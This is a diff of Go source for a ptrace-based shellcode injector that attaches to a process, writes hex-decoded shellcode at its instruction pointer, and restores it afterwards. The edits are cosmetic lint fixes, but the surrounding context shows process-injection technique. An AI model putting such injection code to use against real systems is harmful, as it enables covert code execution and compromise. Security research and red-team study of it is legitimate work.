@@ -21,14 +21,14 @@ import (
 // target process will be restored after shellcode has done its job
 func ShellcodeInjector(shellcode *string, pid int) error {
 	// format
-	*shellcode = strings.Replace(*shellcode, ",", "", -1)
-	*shellcode = strings.Replace(*shellcode, "0x", "", -1)
-	*shellcode = strings.Replace(*shellcode, "\\x", "", -1)
+	*shellcode = strings.ReplaceAll(*shellcode, ",", "")
+	*shellcode = strings.ReplaceAll(*shellcode, "0x", "")
+	*shellcode = strings.ReplaceAll(*shellcode, "\\x", "")
 
 	// decode hex shellcode string
 	sc, err := hex.DecodeString(*shellcode)
 	if err != nil {
-		return fmt.Errorf("Decode shellcode: %v", err)
+		return fmt.Errorf("decode shellcode: %v", err)
 	}
 
 	// save shellcode to a binary file for debugging purposes
@@ -43,7 +43,7 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 		child.SysProcAttr = &syscall.SysProcAttr{Ptrace: true}
 		err = child.Start()
 		if err != nil {
-			return fmt.Errorf("Start `sleep %s`: %v", sec, err)
+			return fmt.Errorf("start `sleep %s`: %v", sec, err)
 		}
 		pid = child.Process.Pid
 
@@ -70,7 +70,7 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 		}
 		_, err = proc.Wait()
 		if err != nil {
-			return fmt.Errorf("Wait %d: %v", pid, err)
+			return fmt.Errorf("wait %d: %v", pid, err)
 		}
 		log.Printf("Injector (%d): attached to %d", os.Getpid(), pid)
 	}
@@ -104,7 +104,7 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 	peekWord := make([]byte, len(data))
 	n, err = syscall.PtracePeekText(pid, uintptr(origRip), peekWord)
 	if err != nil {
-		return fmt.Errorf("PEEK: 0x%x", origRip)
+		return fmt.Errorf("peek: 0x%x", origRip)
 	}
 	log.Printf("Peeked %d bytes of shellcode: %x at RIP (0x%x)", n, peekWord, origRip)
 
@@ -112,7 +112,7 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 	log.Printf("Continuing process %d", pid)
 	err = syscall.PtraceCont(pid, 0)
 	if err != nil {
-		return fmt.Errorf("Continue: %v", err)
+		return fmt.Errorf("continue: %v", err)
 	}
 	log.Printf("Waiting process %d", pid)
 	ws := new(syscall.WaitStatus)
@@ -158,18 +158,18 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 		log.Printf("Peeked %d bytes from RIP: %x at RIP (0x%x)", n, peekWord, stoppedRegs.Rip)
 
 		peek_stack := make([]byte, 128)
-		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rsp), peek_stack)
+		_, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rsp), peek_stack)
 		if err != nil {
 			log.Printf("PEEK stack: 0x%x", stoppedRegs.Rsp)
 		}
 		// also the regs
 		peek_rdi := make([]byte, 64)
-		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rdi), peek_rdi)
+		_, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rdi), peek_rdi)
 		if err != nil {
 			log.Printf("PEEK RDI: 0x%x", stoppedRegs.Rdi)
 		}
 		peek_rsi := make([]byte, 64)
-		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rsi), peek_rsi)
+		_, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rsi), peek_rsi)
 		if err != nil {
 			log.Printf("PEEK RSI: 0x%x", stoppedRegs.Rsi)
 		}
@@ -184,20 +184,20 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 		// restore registers
 		err = syscall.PtraceSetRegs(pid, origRegs)
 		if err != nil {
-			return fmt.Errorf("Restoring process: set regs: %v", err)
+			return fmt.Errorf("restoring process: set regs: %v", err)
 		}
 
 		// breakpoint hit, restore the process
 		n, err = syscall.PtracePokeText(pid, uintptr(origRip), origCode)
 		if err != nil {
-			return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
+			return fmt.Errorf("poke_text at 0x%x %d: %v", uintptr(origRip), pid, err)
 		}
 		log.Printf("Restored %d bytes at origRip (0x%x)", n, origRip)
 
 		// let it run
 		err = syscall.PtraceDetach(pid)
 		if err != nil {
-			return fmt.Errorf("Continue detach: %v", err)
+			return fmt.Errorf("continue detach: %v", err)
 		}
 		log.Printf("%d will continue to run", pid)
 
